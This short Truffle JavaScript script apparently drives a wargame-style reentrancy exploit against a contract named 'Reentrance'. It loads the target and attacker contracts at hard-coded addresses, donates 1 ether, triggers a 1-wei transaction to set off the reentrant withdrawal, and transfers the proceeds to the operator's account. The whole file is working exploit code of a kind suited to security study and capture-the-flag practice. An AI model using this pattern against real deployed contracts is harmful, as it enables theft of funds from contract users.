const Reentrance = artifacts.require("Reentrance");
const ReentranceAttack = artifacts.require("ReentranceAttack");

// change these constants according to your needs
const ReentranceInstanceAddress = "0xdd701bb10d71e67cc480c580a7609ad69c35cab4";
const ReentranceAttackInstanceAddress = "0xc36e5d5337ffb324ba057524a17be9539e923418";
const MyAccount = "0xd80e643cb7d8e81a4cd927b6fbb743fa9b8eb8d9";

async function execute(callback){
  console.log("Start exploit...");
  let reentranceInstance = Reentrance.at(ReentranceInstanceAddress);
  let reentranceAttackInstance = ReentranceAttack.at(ReentranceAttackInstanceAddress);

  console.log("Donate...");
  await reentranceAttackInstance.donateToSelf({value: web3.toWei('1','ether')});
  console.log("Send Transaction...");
  await reentranceAttackInstance.sendTransaction({value: 1});
  console.log("Transfer...");
  await reentranceAttackInstance.transfer(MyAccount);

  callback();
}

module.exports = execute;
